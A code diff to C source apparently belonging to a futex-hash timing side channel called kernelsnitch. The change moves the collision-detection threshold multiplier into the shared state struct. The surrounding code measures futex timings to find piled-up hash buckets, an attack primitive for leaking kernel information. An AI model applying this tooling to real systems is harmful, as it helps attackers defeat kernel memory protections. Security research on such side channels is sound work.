@@ -60,6 +60,7 @@ struct kernelsnitch_shared_state {
     size_t appended_futexes;
     size_t repeat_measurement;
     size_t average;
+    size_t threshold_mult;
 
     volatile unsigned char *futexes;
     volatile unsigned char inc_futex[KS_PAGE_SIZE];
@@ -161,6 +162,9 @@ static void __decrease(struct kernelsnitch_shared_state *ks)
 #endif
 #ifndef AVERAGE
 #define AVERAGE (1<<3)
+#endif
+#ifndef KERNELSNITCH_THRESHOLD_MULT
+#define KERNELSNITCH_THRESHOLD_MULT 10
 #endif
 static int __compare(const void *a, const void *b)
 {
@@ -300,6 +304,7 @@ struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size
     ks->collisions = __collision_cnt;
     ks->verbose = __verbose;
     ks->mte_enabled = __mte_enabled;
+    ks->threshold_mult = KERNELSNITCH_THRESHOLD_MULT;
     ks->appended_futexes = APPENDED_FUTEXES;
     ks->repeat_measurement = REPEAT_MEASUREMENT;
     ks->average = AVERAGE;
@@ -388,9 +393,6 @@ void kernelsnitch_set_search_bounds(
 void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
 {
     #define ID 128
-#ifndef KERNELSNITCH_THRESHOLD_MULT
-#define KERNELSNITCH_THRESHOLD_MULT 10
-#endif
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
 #ifndef KERNELSNITCH_COLLISION_CONFIRMATIONS
 #define KERNELSNITCH_COLLISION_CONFIRMATIONS 1
@@ -407,6 +409,8 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
     size_t approx_time = MIN(
         __measure(ks, (size_t)&ks->futexes[0]),
         __measure(ks, (size_t)&ks->futexes[KS_PAGE_SIZE+8]));
+    size_t threshold_mult = ks->threshold_mult ? ks->threshold_mult :
+        KERNELSNITCH_THRESHOLD_MULT;
 
     // piled-up hash bucket ID 128
     // here, I append 4096 futexes to this hash bucket creating a distinction between most other empty or lightly populated ones
@@ -422,14 +426,14 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
             break;
         futex_addr = (size_t)&ks->futexes[id];
         ks->times[i] = __measure(ks, futex_addr);
-        if (ks->times[i] > (approx_time*KERNELSNITCH_THRESHOLD_MULT)) {
+        if (ks->times[i] > (approx_time*threshold_mult)) {
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
             int confirmed = 1;
             for (size_t confirmation = 1;
                  confirmation < KERNELSNITCH_COLLISION_CONFIRMATIONS;
                  ++confirmation) {
                 if (__measure(ks, futex_addr) <=
-                    (approx_time*KERNELSNITCH_THRESHOLD_MULT)) {
+                    (approx_time*threshold_mult)) {
                     confirmed = 0;
                     break;
                 }
